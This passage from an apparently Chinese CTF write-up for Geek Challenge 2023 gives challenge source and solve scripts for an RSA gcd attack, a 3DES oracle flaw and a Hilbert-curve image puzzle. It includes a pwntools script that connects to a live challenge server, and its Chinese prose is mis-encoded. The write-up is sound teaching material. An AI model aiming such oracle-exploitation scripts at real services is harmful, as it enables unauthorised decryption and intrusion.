<span class="keyword">in</span> <span class="string">&quot;__&quot;</span>] </span><br><span class="line">e1,e2 = [getPrime(<span class="number">17</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="string">&quot;__&quot;</span>] </span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">n = p*q </span><br><span class="line">c1 = gmpy2.powmod(<span class="number">2</span>*p + <span class="number">3</span>*q,e1,n)</span><br><span class="line">c2 = gmpy2.powmod(<span class="number">5</span>*p + <span class="number">7</span>*q,e2,n) </span><br><span class="line">c = gmpy2.powmod(bytes_to_long(flag),e,n) </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;e1=&quot;</span>,e1)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;e2=&quot;</span>,e2) </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c1=&quot;</span>,c1) </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c2=&quot;</span>,c2) </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c=&quot;</span>,c)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;n=&quot;</span>,n)</span><br><span class="line"></span><br><span class="line"><span class="comment">#e1= 113717</span></span><br><span class="line"><span class="comment">#e2= 80737</span></span><br><span class="line"><span class="comment">#c1= 97528398828294138945371018405777243725957112272614466238005409057342884425132214761228537249844134865481148636534134025535106624840957740753950100180978607132333109806554009969378392835952544552269685553539656827070349532458156758965322477969141073720173165958341043159560928836304172136610929023123638981560836183245954461041167802574206323129671965436040047358250847178930436773249800969192016749684095882580749559014647942135761757750292281205876241566597813517452803933496218995755905344070203047797893640399372627351254542342772576533524820435965479881620338366838326652599102311019884528903481310690767832417584600334987458835108576322111553947045733143836419313427495888019352323209000292825566986863770366023326755116931788018138432898323148059980463407567431417724940484236335082696026821105627826117901730695680967455710434307270501190258033004471156993017301443803372029004817834317756597444195146024630164820841200575179112295902020141040090350486764038633257871003899386340004440642516190842086462237559715130631205046041819931656962904630367121414263911179041905140516402771368603623318492074423223885367923228718341206283572152570049573607906130786276734660847733952210105659707746969830132429975090175091281363770357</span></span><br><span class="line"><span class="comment">#c2= 353128571201645377052005694809874806643786163076931670184196149901625274899734977100920488129375537186771931435883114557320913415191396857882995726660784707377672210953334914418470453787964899846194872721616628198368241044602144880543115393715025896206210152190007408112767478800650578941849344868081146624444817544806046188600685873402369145450593575618922226415069043442295774369567389939040265656574664538667552522329712111984168798829635080641332045614585247317991581514218486004191829362787750803153463482021229058714990823658655863245025037102127138472397462755776598314247771125981017814912049441827643898478473451005083533693951329544115861795587564408860828213753948427321483082041546722974666875065831843384005041800692983406353922680299538080900818930589336142421748023025830846906503542594380663429947801329079870530727382679634952272644949425079242992486832995962516376820051495641486546631849426876810933393153871774796182078367277299340503872124124714036499367887886486264658590613431293656417255355575602576047502506125375605713228912611320198066713358654181533335650785578352716562937038768171269136647529849805172492594142026261051266577821582011917001752590659862613307646536049830151262848916867223615064832279222</span></span><br><span class="line"><span class="comment">#c= 375617816311787295279632219241669262704366237192565344884527300748210925539528834207344757670998995567820735715933908541800125317082581328287816628816752542104514363629022246620070560324071543077301256917337165566677142545053272381990573611757629429857842709092285442319141751484248315990593292618113678910350875156232952525787082482638460259354559904243062546518553607882194808191571131590524874275187750985821420412987586148770397073003186510357920710387377990379862185266175190503647626248057084923516190642292152259727446111686043531725993433395002330208067534104745851308178560234372373476331387737629284961288204368572750848248186692623500372605736825205759172773503283282321274793846281079650686871355211691681512637459986684769598186821524093789286661348936784712071312135814683041839882338235290487868969391040389837253093468883093296547473466050960563347060307256735803099039921213839491129726807647623542881247210251994139130146519265086673883077644185971830004165931626986486648581644383717994174627681147696341976767364316172091139507445131410662391699728189797082878876950386933926807186382619331901457205957462337191923354433435013338037399565519987793880572723211669459895193009710035003369626116024630678400746946356</span></span><br><span class="line"><span class="comment">#n= 728002565949733279371529990942440022467681592757835980552797682116929657292509059813629423038094227544032071413317330087468458736175902373398210691802243764786251764982802000867437756347830992118278032311046807282193498960587170291978547754942295932606784354258945168927044376692224049202979158068158842475322825884209352566494900083765571037783472505580851500043517614314755340168507097558967372661966013776090657685241689631615245294004694287660685274079979318342939473469143729494106686592347327776078649315612768988028622890242005700892937828732613800620455225438339852445425046832904615827786856105112781009995862999853122308496903885748394541643702103368974605177097553007573113536089894913967154637055293769061726082740854619536748297829779639633209710676774371525146758917646731487495135734759201537358734170552231657257498090553682791418003138924472103077035355223367678622115314235119493397080290540006942708439607767313672671274857069053688258983103863067394473084183472609906612056828326916114024662795812611685559034285371151973580240723680736227737324052391721149957542711415812665358477474058103338801398214688403784213100455466705770532894531602252798634923125974783427678469124261634518543957766622712661056594132089</span></span><br></pre></td></tr></table></figure></blockquote><p>å‚è€ƒGKCTF 2021 - RRRRsaç›¸å…³æ¨å¯¼ï¼Œæ¶ˆå…ƒæ±‚gcdå¾— $p$ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">e1= <span class="number">113717</span></span><br><span class="line">e2= <span class="number">80737</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c1= <span class="number">97528398828294138945371018405777243725957112272614466238005409057342884425132214761228537249844134865481148636534134025535106624840957740753950100180978607132333109806554009969378392835952544552269685553539656827070349532458156758965322477969141073720173165958341043159560928836304172136610929023123638981560836183245954461041167802574206323129671965436040047358250847178930436773249800969192016749684095882580749559014647942135761757750292281205876241566597813517452803933496218995755905344070203047797893640399372627351254542342772576533524820435965479881620338366838326652599102311019884528903481310690767832417584600334987458835108576322111553947045733143836419313427495888019352323209000292825566986863770366023326755116931788018138432898323148059980463407567431417724940484236335082696026821105627826117901730695680967455710434307270501190258033004471156993017301443803372029004817834317756597444195146024630164820841200575179112295902020141040090350486764038633257871003899386340004440642516190842086462237559715130631205046041819931656962904630367121414263911179041905140516402771368603623318492074423223885367923228718341206283572152570049573607906130786276734660847733952210105659707746969830132429975090175091281363770357</span></span><br><span class="line">c2= <span class="number">353128571201645377052005694809874806643786163076931670184196149901625274899734977100920488129375537186771931435883114557320913415191396857882995726660784707377672210953334914418470453787964899846194872721616628198368241044602144880543115393715025896206210152190007408112767478800650578941849344868081146624444817544806046188600685873402369145450593575618922226415069043442295774369567389939040265656574664538667552522329712111984168798829635080641332045614585247317991581514218486004191829362787750803153463482021229058714990823658655863245025037102127138472397462755776598314247771125981017814912049441827643898478473451005083533693951329544115861795587564408860828213753948427321483082041546722974666875065831843384005041800692983406353922680299538080900818930589336142421748023025830846906503542594380663429947801329079870530727382679634952272644949425079242992486832995962516376820051495641486546631849426876810933393153871774796182078367277299340503872124124714036499367887886486264658590613431293656417255355575602576047502506125375605713228912611320198066713358654181533335650785578352716562937038768171269136647529849805172492594142026261051266577821582011917001752590659862613307646536049830151262848916867223615064832279222</span></span><br><span class="line">c= <span class="number">375617816311787295279632219241669262704366237192565344884527300748210925539528834207344757670998995567820735715933908541800125317082581328287816628816752542104514363629022246620070560324071543077301256917337165566677142545053272381990573611757629429857842709092285442319141751484248315990593292618113678910350875156232952525787082482638460259354559904243062546518553607882194808191571131590524874275187750985821420412987586148770397073003186510357920710387377990379862185266175190503647626248057084923516190642292152259727446111686043531725993433395002330208067534104745851308178560234372373476331387737629284961288204368572750848248186692623500372605736825205759172773503283282321274793846281079650686871355211691681512637459986684769598186821524093789286661348936784712071312135814683041839882338235290487868969391040389837253093468883093296547473466050960563347060307256735803099039921213839491129726807647623542881247210251994139130146519265086673883077644185971830004165931626986486648581644383717994174627681147696341976767364316172091139507445131410662391699728189797082878876950386933926807186382619331901457205957462337191923354433435013338037399565519987793880572723211669459895193009710035003369626116024630678400746946356</span></span><br><span class="line">n= <span class="number">728002565949733279371529990942440022467681592757835980552797682116929657292509059813629423038094227544032071413317330087468458736175902373398210691802243764786251764982802000867437756347830992118278032311046807282193498960587170291978547754942295932606784354258945168927044376692224049202979158068158842475322825884209352566494900083765571037783472505580851500043517614314755340168507097558967372661966013776090657685241689631615245294004694287660685274079979318342939473469143729494106686592347327776078649315612768988028622890242005700892937828732613800620455225438339852445425046832904615827786856105112781009995862999853122308496903885748394541643702103368974605177097553007573113536089894913967154637055293769061726082740854619536748297829779639633209710676774371525146758917646731487495135734759201537358734170552231657257498090553682791418003138924472103077035355223367678622115314235119493397080290540006942708439607767313672671274857069053688258983103863067394473084183472609906612056828326916114024662795812611685559034285371151973580240723680736227737324052391721149957542711415812665358477474058103338801398214688403784213100455466705770532894531602252798634923125974783427678469124261634518543957766622712661056594132089</span></span><br><span class="line"></span><br><span class="line">x1 = <span class="built_in">pow</span>(c1 * <span class="built_in">pow</span>(<span class="number">3</span>, -e1, n),e2,n)</span><br><span class="line">x2 = <span class="built_in">pow</span>(c2 * <span class="built_in">pow</span>(<span class="number">7</span>, -e2, n),e1,n)</span><br><span class="line">p = gcd(x1-x2, n)</span><br><span class="line">q = n//p</span><br><span class="line">f = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = inverse_mod(e,f)</span><br><span class="line">m= <span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;SYC&#123;poly_rsa_Just_need5_s1mple_gcd&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>â€‹</p><h3 id="Simple3DES"><a href="#Simple3DES" class="headerlink" title="Simple3DES"></a>Simple3DES</h3><blockquote><p>é¢˜ç›®é“¾æ¥ï¼šnc 59.110.20.54:23333 <a target="_blank" rel="noopener" href="https://blog.csdn.net/Mr_wzc/article/details/121713518">https://blog.csdn.net/Mr_wzc/article/details/121713518</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> DES3</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">xor = <span class="keyword">lambda</span> a,b: <span class="built_in">bytes</span>([a[i % <span class="built_in">len</span>(a)] ^ b[i % <span class="built_in">len</span>(b)] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">max</span>(<span class="built_in">len</span>(a), <span class="built_in">len</span>(b)))])</span><br><span class="line">pad = <span class="keyword">lambda</span> msg,padlen: msg+<span class="built_in">chr</span>((padlen-(<span class="built_in">len</span>(msg)%padlen))).encode()*(padlen-(<span class="built_in">len</span>(msg)%padlen))</span><br><span class="line"></span><br><span class="line">flag = os.environ.get(<span class="string">&quot;FLAG&quot;</span>, <span class="string">&quot;SYC&#123;Al3XEI_FAKE_FLAG&#125;&quot;</span>).encode()</span><br><span class="line">sec = os.urandom(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">banner = <span class="string">&#x27;|&#x27;</span>*<span class="number">70</span></span><br><span class="line"></span><br><span class="line">DEBUG = <span class="literal">False</span> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">proof_of_work</span>():</span><br><span class="line">    <span class="keyword">if</span> DEBUG:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    proof = <span class="string">&#x27;&#x27;</span>.join([random.choice(string.ascii_letters+string.digits) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>)])</span><br><span class="line">    digest = hashlib.sha256(proof.encode()).hexdigest()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;sha256(XXXX+%s) == %s&quot;</span> % (proof[<span class="number">4</span>:], digest))</span><br><span class="line">    x = <span class="built_in">input</span>(<span class="string">&quot;Give me XXXX: &quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(x)!=<span class="number">4</span> <span class="keyword">or</span> hashlib.sha256((x+proof[<span class="number">4</span>:]).encode()).hexdigest() != digest:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Right!&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">enc</span>(<span class="params">msg,key</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        key = long_to_bytes(key)</span><br><span class="line">        msg = xor(long_to_bytes(msg),sec)</span><br><span class="line">        des = DES3.new(key,DES3.MODE_ECB)</span><br><span class="line">        ct = xor(des.encrypt(pad(msg,<span class="number">8</span>)),sec)</span><br><span class="line">        <span class="keyword">return</span> bytes_to_long(ct)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(e)</span><br><span class="line">        <span class="keyword">return</span> Exception</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">service</span>():</span><br><span class="line">    cnt = <span class="number">0</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> proof_of_work():</span><br><span class="line">        exit()</span><br><span class="line">    <span class="built_in">print</span>(banner)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Simple DES Encryption Service&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(banner)</span><br><span class="line">    <span class="keyword">while</span> cnt&lt;<span class="number">2</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;1. Encrypt\n2. Get encrypted flag.&#x27;</span>)</span><br><span class="line">        choice = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&#x27;&gt; &#x27;</span>))</span><br><span class="line">        <span class="keyword">if</span> choice == <span class="number">1</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;Input msg:&#x27;</span>)</span><br><span class="line">            msg = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&#x27;&gt; &#x27;</span>).strip())</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;Input key:&#x27;</span>)</span><br><span class="line">            key = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&#x27;&gt; &#x27;</span>).strip())</span><br><span class="line">            <span class="built_in">print</span>(enc(msg,key))</span><br><span class="line">        <span class="keyword">elif</span> choice == <span class="number">2</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;Input key:&#x27;</span>)</span><br><span class="line">            key = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&#x27;&gt; &#x27;</span>).strip())</span><br><span class="line">            <span class="built_in">print</span>(enc(bytes_to_long(flag),key))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            exit()</span><br><span class="line">        cnt+=<span class="number">1</span></span><br><span class="line">    <span class="built_in">print</span>(banner)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Bye!&#x27;</span>)</span><br><span class="line">    exit()</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    service()</span><br><span class="line"><span class="keyword">except</span> Exception:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Something goes wrong...\n&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(banner+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    exit()</span><br></pre></td></tr></table></figure></blockquote><p>ä»£ç é—®é¢˜åœ¨å…ˆxoråpadï¼Œå¯¹äº <code>m=b&#39;\x00&#39;</code>ï¼Œæœ‰ <code>m^sec=sec</code>ï¼Œ<code>pad(sec,8)=sec+b&#39;\x08&#39;*8</code>ã€‚</p><p>ç¬¬ä¸€è½®ï¼š</p><p><code>pad(sec,8)=sec+b&#39;\x08&#39;*8</code>ï¼ŒåŠ å¯†å¾—åˆ° <code>c1^x | c2^x</code>ï¼Œåˆç”± <code>b&#39;\x08&#39;*8</code> å¯æ±‚å‡º <code>c2</code>ï¼Œå¾—åˆ° <code>x</code>ã€‚</p><p>ç¬¬äºŒè½®ï¼š</p><p>å·²çŸ¥ <code>c&#39;^x</code>ï¼Œè§£å¯†å¾—åˆ° <code>flag^x</code>ï¼Œå†å¼‚æˆ–å¾—åˆ° <code>flag</code>ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">from</span> pwnlib.util.iters <span class="keyword">import</span> mbruteforce</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> DES3</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&quot;59.110.20.54&quot;</span>,<span class="number">23333</span>)</span><br><span class="line"></span><br><span class="line">table = string.ascii_letters+string.digits</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">PoW</span>():</span><br><span class="line">    r.recvuntil(<span class="string">b&quot;XXXX+&quot;</span>)</span><br><span class="line">    suffix = r.recv(<span class="number">16</span>).decode(<span class="string">&quot;utf8&quot;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&quot;== &quot;</span>)</span><br><span class="line">    cipher = r.recvline().strip().decode(<span class="string">&quot;utf8&quot;</span>)</span><br><span class="line">    proof = mbruteforce(<span class="keyword">lambda</span> x: sha256((x + suffix).encode()).hexdigest() ==</span><br><span class="line">                        cipher, table, length=<span class="number">4</span>, method=<span class="string">&#x27;fixed&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;XXXX: &#x27;</span>, proof.encode())</span><br><span class="line">    </span><br><span class="line">PoW()</span><br><span class="line"></span><br><span class="line">xor = <span class="keyword">lambda</span> a,b: <span class="built_in">bytes</span>([a[i % <span class="built_in">len</span>(a)] ^ b[i % <span class="built_in">len</span>(b)] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">max</span>(<span class="built_in">len</span>(a), <span class="built_in">len</span>(b)))])</span><br><span class="line"></span><br><span class="line">m = bytes_to_long(<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">key = bytes_to_long(<span class="string">b&#x27;abcdefgh&#x27;</span>+<span class="string">b&#x27;ijklmnop&#x27;</span>+<span class="string">b&#x27;qrstuvwx&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">b&#x27;flag.\n&#x27;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;&gt; &#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;msg:\n&#x27;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;&gt; &#x27;</span>,<span class="built_in">str</span>(m).encode())</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;key:\n&#x27;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;&gt; &#x27;</span>,<span class="built_in">str</span>(key).encode())</span><br><span class="line"></span><br><span class="line">c_xor = long_to_bytes(<span class="built_in">eval</span>(r.recvline()))</span><br><span class="line">c1_xor,c2_xor = c_xor[:<span class="number">8</span>],c_xor[<span class="number">8</span>:]</span><br><span class="line"></span><br><span class="line">des = DES3.new(long_to_bytes(key),DES3.MODE_ECB)</span><br><span class="line"></span><br><span class="line">c2 = des.encrypt(<span class="string">b&#x27;\x08&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">sec = xor(c2,c2_xor)</span><br><span class="line"><span class="built_in">print</span>(sec)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">b&#x27;flag.\n&#x27;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;&gt; &#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;key:\n&#x27;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;&gt; &#x27;</span>,<span class="built_in">str</span>(key).encode())</span><br><span class="line"></span><br><span class="line">flag_c_xor = long_to_bytes(<span class="built_in">eval</span>(r.recvline()))</span><br><span class="line">flag_c = xor(flag_c_xor,sec)</span><br><span class="line">flag_xor = des.decrypt(flag_c)</span><br><span class="line">flag = xor(flag_xor,sec)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;SYC&#123;DES_1s_0ut_0f_t1me&#125;o&#x27; </span></span><br></pre></td></tr></table></figure><p>â€‹</p><h3 id="JPGDiff"><a href="#JPGDiff" class="headerlink" title="JPGDiff"></a>JPGDiff</h3><blockquote><p>å›¾ç‰‡ä¸­çš„å­—ç¬¦ä¸²å³ä¸ºflag</p></blockquote><p>æç¤ºå›¾ç‰‡ä¸ºHilbertæ›²çº¿ï¼Œä¸”é•¿å›¾ä¸º1*65536çš„jpgå›¾ç‰‡ï¼Œç¬¦åˆ8é˜¶Hilbertæ›²çº¿çš„èŠ‚ç‚¹æ•°ã€‚</p><p>æŒ‰8é˜¶Hilbertæ›²çº¿çš„é¡ºåºæ¥å¸ƒç½®æ¯ä¸€ä¸ª1*1åƒç´ ï¼Œå³å¯è¿˜åŸåŸå§‹å›¾ç‰‡ã€‚</p><p>åˆ©ç”¨<a target="_blank" rel="noopener" href="https://github.com/galtay/hilbertcurve">hilbertcurve</a>åŒ…å®Œæˆæ„é€ ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> hilbertcurve.hilbertcurve <span class="keyword">import</span> HilbertCurve</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image </span><br><span class="line">im_cp = Image.<span class="built_in">open</span>(<span class="string">&quot;ct.png&quot;</span>)</span><br><span class="line">im_new = Image.new(<span class="string">&#x27;RGB&#x27;</span>,(<span class="number">256</span>,<span class="number">256</span>)) </span><br><span class="line"></span><br><span class="line">p=<span class="number">8</span>; n=<span class="number">2</span></span><br><span class="line">hilbert_curve = HilbertCurve(p, n)</span><br><span class="line">distances = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">65536</span>))</span><br><span class="line">points = hilbert_curve.points_from_distances(distances)</span><br><span class="line">order = []</span><br><span class="line"><span class="keyword">for</span> point, dist <span class="keyword">in</span> <span class="built_in">zip</span>(points, distances):</span><br><span class="line">    <span class="comment">#print(f&#x27;&#123;dist&#125; = &#123;tuple(point)&#125;&#x27;)</span></span><br><span class="line">    order.append(<span class="built_in">tuple</span>(point))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(order))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">65536</span>):</span><br><span class="line">    tmp = im_cp.getpixel((<span class="number">0</span>,k))</span><br><span class="line">    im_new.putpixel(order[k],tmp)</span><br><span class="line">    </span><br><span class="line">im_new.save(<span class="string">&#x27;m.png&#x27;</span>)</span><br></pre></td></tr></table></figure><p>å¾—åˆ°å›¾ç‰‡ï¼š</p><p><img src="/2023/11/27/match-Geek-Challenge-2023/m-1701104909234-1.png" alt="m"></p><p>flagï¼š<code>SYC&#123;H1LB5RT_C1pher&#125;</code></p><p>â€‹</p><h3 id="Energetic-Carcano"><a href="#Energetic-Carcano" class="headerlink" title="Energetic_Carcano"></a>Energetic_Carcano</h3><blockquote><p>é¢˜ç›®é“¾æ¥ï¼šnc 59.110.20.54:8763 <a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Elliptic-curve_cryptography">https://en.wikipedia.org/wiki/Elliptic-curve_cryptography</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># from sage.all import *</span></span><br><span class="line"><span class="keyword">import</span> os </span><br><span class="line"><span class="keyword">import</span> random </span><br><span class="line"><span class="keyword">import</span> string </span><br><span class="line"><span class="keyword">import</span> hashlib 